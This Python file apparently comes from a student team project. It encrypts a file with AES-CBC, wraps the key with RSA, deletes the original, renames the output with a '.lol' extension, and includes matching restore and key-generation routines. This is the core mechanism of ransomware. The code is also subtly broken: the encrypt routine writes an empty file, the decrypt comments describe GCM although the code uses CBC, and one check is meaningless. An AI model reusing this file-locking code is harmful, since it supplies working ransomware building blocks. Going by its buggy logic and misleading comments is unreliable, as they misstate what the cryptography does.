# -*- coding: utf-8 -*-

"""
Team: Sleeper Reapers
Members: Anthony & Raul
"""

import os
import json
import base64
import constants

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import (
    Cipher, algorithms, modes
)
from cryptography.hazmat.primitives.asymmetric.padding import OAEP
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric.padding import MGF1
from cryptography.hazmat.primitives.asymmetric import rsa


def Myencrypt(message, key):
    if len(key) < constants.REQ_KEY_BYTES:
        return "Error: key length was less than the required bytes"
    else:
        # Generate a random IV of IV_LENGTH.
        IV = os.urandom(constants.IV_LENGTH)
        # Construct an AES-CBC Cipher object with the given key and a
        # randomly generated IV.
        encryptor = Cipher(
            algorithms.AES(key),
            modes.CBC(IV),
            backend=default_backend()
        ).encryptor()

        # Encrypt the plaintext and get the associated ciphertext.
        C = encryptor.update(message) + encryptor.finalize()

        return C, IV


def MyfileEncrypt(filepath):
    # reads file as bytes
    with open(filepath, "rb") as file:
        # reads the file as a string and stored in fileToString
        fileToString = base64.b64encode(file.read())
        # initializes the padder
        padder = padding.PKCS7(constants.PADDING_SIZE).padder()
        # pads the string
        paddedString = padder.update(fileToString)
        # generates a random Key of KEY_LENGTH
        Key = os.urandom(constants.KEY_LENGTH)
        # uses module to generate C and IV
        C, IV = Myencrypt(paddedString, Key)
        # splits the filepath to get the separate filename and file_ext
        filename, file_ext = os.path.splitext(filepath)
        # creates an encrypted file of .lol ext
        newExt = ".lol"
        newName = filename + newExt
        # creates a file of newExt
        encryptedFile = open(newName, 'w')

        # closes files
        encryptedFile.close()
        file.close()

    # removes original file
    os.remove(filepath)

    return C, IV, Key, newExt


def MyRSAEncrypt(filepath, RSA_PublicKey_FilePath):
    # encrypts file
    C, IV, Key, file_ext = MyfileEncrypt(filepath)

    # loads the public key
    with open(RSA_PublicKey_FilePath, "rb") as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read(),
            backend=default_backend()
        )
    # encrypt the key for RSAcipher
    RSAcipher = public_key.encrypt(
        Key,
        OAEP(
            mgf=MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    # separates filename and ext
    filename, file_extOld = os.path.splitext(filepath)

    # appends filename with encrypted file_ext
    newFile = filename + file_ext

    # creates RSAEncrypted file
    encryptedFile = open(newFile, 'w')

    # dictionary to be stored in json
    secretInfo = {}

    # converts bytes to non-bytes, so they can be stored on json
    secretInfo["RSAcipher"] = base64.b64encode(RSAcipher).decode('utf-8')
    secretInfo["ciphertext"] = base64.b64encode(C).decode('utf-8')
    secretInfo["IV"] = base64.b64encode(IV).decode('utf-8')
    secretInfo["file_extension"] = file_extOld

    # dump the data from json onto the created file
    json.dump(secretInfo, encryptedFile)

    # close all opened files
    encryptedFile.close()
    key_file.close()

    # return RSAcipher, C, IV, file_ext


def Mydecrypt(Key, IV, C):
    # Construct a Cipher object, with the key, iv, and additionally the
    # GCM tag used for authenticating the message.
    decryptor = Cipher(
        algorithms.AES(Key),
        modes.CBC(IV),
        backend=default_backend()
    ).decryptor()
    # Decryption gets us the authenticated plaintext.
    # If the tag does not match an InvalidTag exception will be raised.
    plaintext = decryptor.update(C) + decryptor.finalize()
    return plaintext


def MyfileDecrypt(filepath):
    # reads the file
    jread = open(filepath, 'r')
    # loads all the json content
    jsonContent = json.load(jread)
    # decodes all json data into their variables
    IV = base64.b64decode(jsonContent["IV"])
    C = base64.b64decode(jsonContent["ciphertext"])
    RSAcipher = base64.b64decode(jsonContent["RSAcipher"])
    file_ext = jsonContent["file_extension"]

    # close json file
    jread.close()

    return C, RSAcipher, IV, file_ext


def MyRSADecrypt(filepath, RSA_PrivateKey_FilePath):
    # decrypts file
    C, RSAcipher, IV, file_ext = MyfileDecrypt(filepath)

    # separates the filename and extension
    filename, file_extension = os.path.splitext(filepath)
    # original file name and ext appended
    originalFile = filename + file_ext
    if C != 0:
        # load private key
        with open(RSA_PrivateKey_FilePath, "rb") as key_file:
            private_key = serialization.load_pem_private_key(
                key_file.read(),
                password=None,
                backend=default_backend()
            )

        # decrypt RSACipher to retrieve the key
        Key = private_key.decrypt(
            RSAcipher,
            OAEP(
                mgf=MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        # get decrypted plaintext
        decryptedPT = Mydecrypt(Key, IV, C)
        # initializes the unpadder
        unpadder = padding.PKCS7(constants.PADDING_SIZE).unpadder()
        # removes the padding from the plaintext
        unpaddedPT = base64.b64decode(unpadder.update(decryptedPT))
        # recreates file with original name
        replace = open(originalFile, "wb")
        # write original data on recreated file
        replace.write(unpaddedPT)

        # closes all opened files
        replace.close()
        key_file.close()

        # removes encrypted file
        os.remove(filepath)

        # return RSAcipher, C, IV, file_ext
    else:
        print('There was a problem with the file ' + originalFile + ' no decryption executed')


def keyGenerator():
    # generates a private key
    private_key = rsa.generate_private_key(
                    public_exponent=65537,
                    key_size=2048,
                    backend=default_backend()
                    )
    # generates a public key
    public_key = private_key.public_key()

    # serializes private key
    serialPrivateKey = private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                    encryption_algorithm=serialization.NoEncryption()
                    )
    # serializes public key
    serialPublicKey = public_key.public_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PublicFormat.SubjectPublicKeyInfo
                    )
    # creates a pem file for private key
    with open("private_key.pem", 'wb') as privateFile:
        privateFile.write(serialPrivateKey) # writes private key onto file
    # creates a pem file for public key
    with open("public_key.pem", 'wb') as publicFile:
        publicFile.write(serialPublicKey)   # writes public key onto file

    # closes both files
    privateFile.close()
    publicFile.close()
